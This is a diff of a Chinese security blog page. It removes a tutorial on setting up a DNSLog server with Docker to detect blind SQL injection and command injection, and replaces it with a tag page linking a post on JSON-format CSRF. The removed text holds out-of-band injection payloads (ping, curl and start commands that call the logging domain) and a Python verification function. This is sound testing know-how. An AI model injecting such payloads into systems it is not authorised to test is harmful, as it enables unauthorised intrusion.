@@ -6,18 +6,17 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="//shystartree.com">
-  <title>搭建dnslog服务器检测盲注和命令注入 | qingyu&#39;s blog</title>
+  <title>Tag: json | qingyu&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="keywords" content="安全,dnslog">
-<meta property="og:type" content="article">
-<meta property="og:title" content="搭建dnslog服务器检测盲注和命令注入">
-<meta property="og:url" content="//shystartree.com/2018/02/28/搭建dnslog服务器检测盲注和命令注入/index.html">
+  <meta name="description" content="生活或许对你不尽人意，但是又如何呢，你活得开心就够了！">
+<meta property="og:type" content="website">
+<meta property="og:title" content="qingyu&#39;s blog">
+<meta property="og:url" content="//shystartree.com/tags/json/index.html">
 <meta property="og:site_name" content="qingyu&#39;s blog">
-<meta property="og:image" content="http://pjcv7vbgq.bkt.clouddn.com/dnslog.jpg">
-<meta property="og:updated_time" content="2018-12-07T07:35:34.756Z">
+<meta property="og:description" content="生活或许对你不尽人意，但是又如何呢，你活得开心就够了！">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="搭建dnslog服务器检测盲注和命令注入">
-<meta name="twitter:image" content="http://pjcv7vbgq.bkt.clouddn.com/dnslog.jpg">
+<meta name="twitter:title" content="qingyu&#39;s blog">
+<meta name="twitter:description" content="生活或许对你不尽人意，但是又如何呢，你活得开心就够了！">
   
     <link rel="alternative" href="/atom.xml" title="qingyu&#39;s blog" type="application/atom+xml">
   
@@ -153,117 +152,36 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-搭建dnslog服务器检测盲注和命令注入" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
+            
   
-    <h1 class="article-title" itemprop="name">
-      搭建dnslog服务器检测盲注和命令注入
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2018" class="archive-year">2018</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2018/12/08/谈谈json格式下的csrf攻击/" class="archive-article-date">
+  	<time datetime="2018-12-08T02:28:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-08</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2018/12/08/谈谈json格式下的csrf攻击/">谈谈json格式下的csrf攻击</a>
     </h1>
   
 
-
-<!-- 显示阅读数 -->
-
-<br/>
-<a class="cloud-tie-join-count" href="javascript:void(0);" style="color:gray;font-size:14px;">
-<span class="icon-sort"></span>
-<span id="busuanzi_container_page_pv" style="color:#ef7522;font-size:14px;">
-          阅读数: <span id="busuanzi_value_page_pv"></span>次 &nbsp;&nbsp;
-</span>
-</a>
-
-
-
-        
-        <a href="/2018/02/28/搭建dnslog服务器检测盲注和命令注入/" class="archive-article-date">
-  	<time datetime="2018-02-28T02:29:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-02-28</time>
-</a>
-        
-      </header>
-    
-    <!-- 目录内容 -->
-
-<!-- 目录内容结束 -->
-
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><img src="http://pjcv7vbgq.bkt.clouddn.com/dnslog.jpg" alt="dnslog"></p>
-<a id="more"></a>
-<h4 id="0x0、域名和配置"><a href="#0x0、域名和配置" class="headerlink" title="0x0、域名和配置"></a>0x0、域名和配置</h4><p>准备两个域名 shystartree.com &amp; shystartree.xxx<br>shystartree.com作为NS服务器域名,增加两行dns记录：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A	ns2	默认	198.44.172.25	-- 10 分钟 --</span><br><span class="line">A	ns1	默认	198.44.172.25	-- 10 分钟 --</span><br></pre></td></tr></table></figure></p>
-<p>shystartree.xxx用作记录域名，此时我并不是增加dns记录(直接增加dns记录会失灵，不知啥回事)，而是直接修改dns服务器<br>修改shystartree.xxx域名的DNS服务器为：<code>ns1.shystartree.com、ns2.shystartree.com</code><br><em>生效时间可能需要48小时，请耐心等候</em></p>
-<h4 id="0x1、文件准备"><a href="#0x1、文件准备" class="headerlink" title="0x1、文件准备"></a>0x1、文件准备</h4><p>dockerfile内容如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:14.04</span><br><span class="line"></span><br><span class="line">RUN sed -i &apos;s/archive.ubuntu.com/mirrors.ustc.edu.cn/g&apos; /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line">RUN apt-get update -y &amp;&amp; apt-get install -y python &amp;&amp; apt-get install python-pip -y &amp;&amp; apt-get install git -y</span><br><span class="line">RUN git clone https://github.com/bit4woo/DNSLog</span><br><span class="line">WORKDIR /DNSLog/dnslog</span><br><span class="line">RUN pip install -r requirements.pip</span><br><span class="line"></span><br><span class="line">COPY ./settings.py /DNSLog/dnslog/dnslog/settings.py</span><br><span class="line"></span><br><span class="line">COPY ./start.sh /DNSLog/dnslog/start.sh</span><br><span class="line">RUN chmod +x start.sh</span><br><span class="line">CMD [&quot;./start.sh&quot;]</span><br><span class="line"></span><br><span class="line">EXPOSE 80</span><br></pre></td></tr></table></figure></p>
-<p>下载 dnslog/dnslog/settings.py 并对如下字段进行对应的修改，保存settings.py：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 做dns记录的域名</span><br><span class="line">DNS_DOMAIN = &apos;shystartree.xxx&apos;</span><br><span class="line"></span><br><span class="line"># 记录管理的域名</span><br><span class="line"></span><br><span class="line">ADMIN_DOMAIN = &apos;admin.shystartree.xxx&apos;</span><br><span class="line"></span><br><span class="line"># NS域名</span><br><span class="line"></span><br><span class="line">NS1_DOMAIN = &apos;ns1.shystartree.com&apos;</span><br><span class="line">NS2_DOMAIN = &apos;ns2.shystartree.com&apos;</span><br><span class="line"></span><br><span class="line"># 服务器外网地址</span><br><span class="line"></span><br><span class="line">SERVER_IP = &apos;198.88.188.88&apos;</span><br></pre></td></tr></table></figure></p>
-<p>创建一个dnslog的启动脚本，保存为start.sh：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">python manage.py runserver 0.0.0.0:80</span><br></pre></td></tr></table></figure></p>
-<h4 id="0x2、构建docker"><a href="#0x2、构建docker" class="headerlink" title="0x2、构建docker"></a>0x2、构建docker</h4><p>准备上述的三个文件<strong>dockerfile、settings.py、start.sh</strong> 执行下面的命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker build .</span><br><span class="line">docker tag e99c409f6585 bit4/dnslog</span><br><span class="line">docker run -d -it -p 80:80 -p 53:53/udp bit4/dnslog</span><br><span class="line"></span><br><span class="line">docker exec -it container_ID_or_name /bin/bash</span><br><span class="line">./start.sh</span><br></pre></td></tr></table></figure></p>
-<p>执行完后，默认已经开启dnslog服务器了</p>
-<h4 id="0x3、配置验证"><a href="#0x3、配置验证" class="headerlink" title="0x3、配置验证"></a>0x3、配置验证</h4><p>使用nslookup命令进行验证，如果可以直接测试xxx.test.shystartree.xxx了，说明所有配置已经全部生效；如果直接查询失败，而指定了dns服务器为 ns1.shystartree.com查询成功，说明dns服务器配置正确了，但是ns记录的设置需要等待同步或者配置错误。</p>
-<p>nslookup输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xxx.test.shystartree.xxx</span><br><span class="line">server ns1.shystartree.com</span><br><span class="line">yyy.test.shystartree.xxx</span><br></pre></td></tr></table></figure></p>
-<p>也可以ping下test.shystartree.xxx，打开 admin.shystartree.xxx看看是否有记录</p>
-<h4 id="0x4、payload使用技巧"><a href="#0x4、payload使用技巧" class="headerlink" title="0x4、payload使用技巧"></a>0x4、payload使用技巧</h4><p>linux&amp;windows通用：<code>ping -n 3 xxx.shystartree.xxx || ping -c 3 xxx.shystartree.xxx</code><br>linux:  <code>curl xxxxxxxxxxxx.shystartree.xxx</code><br>windows: <code>start http://xxxxxxxxxxxx.shystartree.xxx</code></p>
-<h4 id="0x5、使用payload检测漏洞"><a href="#0x5、使用payload检测漏洞" class="headerlink" title="0x5、使用payload检测漏洞"></a>0x5、使用payload检测漏洞</h4><p>检测命令注入或盲注漏洞的时候，会生成一串md5字符串，即find_str,然后访问dnslog后台看是否有对应的md5字符串记录，有即存在漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 确定命令注入是否存在</span><br><span class="line">def verify_conmand(dnslog_server, find_str):</span><br><span class="line">    dnslog_server = dnslog_server.replace(&quot;test.&quot;, &quot;&quot;)</span><br><span class="line">    token = get_token(dnslog_server)</span><br><span class="line">    get_dnsurl = &quot;http://%s/apiquery/dns/test/%s/&quot; % (dnslog_server, token)</span><br><span class="line">    get_weburl = &quot;http://%s/apiquery/web/test/%s/&quot; % (dnslog_server, token)</span><br><span class="line">    res_dnsapi = requests.get(url=get_dnsurl).content</span><br><span class="line">    res_webapi = requests.get(url=get_weburl).content</span><br><span class="line">    if res_webapi.count(&quot;:&quot;) &gt; 0 and res_webapi.count(&quot;&#123;&quot;) &gt; 0 and res_webapi.count(&quot;&#125;&quot;) &gt; 0:</span><br><span class="line">        getwebapi = json.loads(res_webapi)</span><br><span class="line">        if getwebapi[&apos;status&apos;] and find_str in getwebapi[&apos;content&apos;]:</span><br><span class="line">            return True</span><br><span class="line">    if res_dnsapi.count(&quot;:&quot;) &gt; 0 and res_dnsapi.count(&quot;&#123;&quot;) &gt; 0 and res_dnsapi.count(&quot;&#125;&quot;) &gt; 0:</span><br><span class="line">        getdnsapi = json.loads(res_dnsapi)</span><br><span class="line">        if getdnsapi[&apos;status&apos;] and find_str in getdnsapi[&apos;content&apos;]:</span><br><span class="line">            return True</span><br><span class="line">    return False</span><br></pre></td></tr></table></figure></p>
-<blockquote>
-<p>参考文章：<br><a href="http://www.code2sec.com/shi-yong-dockerda-jian-dnslogfu-wu-qi-pythonban-kai-yuan-cloudeyede-bu-shu.html" target="_blank" rel="noopener">使用docker搭建dnslog服务器</a></p>
-</blockquote>
-
-      
-
-
-
-      
-
-  <div class="declare">
-  <br><br>
-  <strong>本文链接：</strong>
-  http://shystartree.com/2018/02/28/搭建dnslog服务器检测盲注和命令注入/
-  <br>
-  <strong>版权声明：</strong>本博客所有文章除特别声明外，均采用<a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/3.0/">CC BY-NC-SA 3.0</a><a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/3.0/"><img alt="知识共享许可协议" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png"/></a>许可协议。欢迎转载，但转载请注明来自qingyu’s blog，并保持转载后文章内容的完整，本人保留所有版权相关权利。
-  
-  
-  </div>
-
-
-
-
-
-      
-        <div class="page-reward">
-          <a href="javascript:;" class="page-reward-btn tooltip-top">
-            <div class="tooltip tooltip-east">
-            <span class="tooltip-item">
-              赏
-            </span>
-            <span class="tooltip-content">
-              <span class="tooltip-text">
-                <span class="tooltip-inner">
-                  <p class="reward-p"><i class="icon icon-quo-left"></i>请我吃杯奶茶呗～～～<i class="icon icon-quo-right"></i></p>
-                  <div class="reward-box">
-                    
-                    <div class="reward-box-item">
-                      <img class="reward-img" src="/img/alipay.jpg">
-                      <span class="reward-type">支付宝</span>
-                    </div>
-                    
-                    
-                    <div class="reward-box-item">
-                      <img class="reward-img" src="/img/wxpay.jpg">
-                      <span class="reward-type">微信</span>
-                    </div>
-                    
-                  </div>
-                </span>
-              </span>
-            </span>
-          </div>
-          </a>
-        </div>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
+        <div class="article-info info-on-right">
+          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -273,145 +191,25 @@
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">dnslog</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">json</a>
         		</li>
       		
 		</ul>
 	</div>
 
-      
+          
 
-      
-
-      
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
         </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://shystartree.com/2018/02/28/搭建dnslog服务器检测盲注和命令注入/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-      
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
-  
-<nav id="article-nav">
-  
-    <a href="/2018/04/27/愉快地进行网站钓鱼/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          愉快地进行网站钓鱼
-        
-      </div>
-    </a>
   
   
-    <a href="/2018/01/12/八尾猫/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">八尾猫</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-  
-  
+    </div></section>
   
 
-  
-
-  
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '#vcomment',
-            notify: notify,
-            verify: verify,
-            app_id: "cPIja8hEdmK0DO1mNhmKUtdb-gzGzoHsz",
-            app_key: "rAG7JWw8FX9LqnHJj0NTvGdW",
-            placeholder: "别默默地路过，吐槽下嘛～～～",
-            avatar:"mm"
-        });
-    }
-</script>
-
-    </section>
-  
-
-  
-
-  
+    
 
 
           </div>
@@ -442,9 +240,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: true,
+		isPost: false,
 		isArchive: false,
-		isTag: false,
+		isTag: true,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
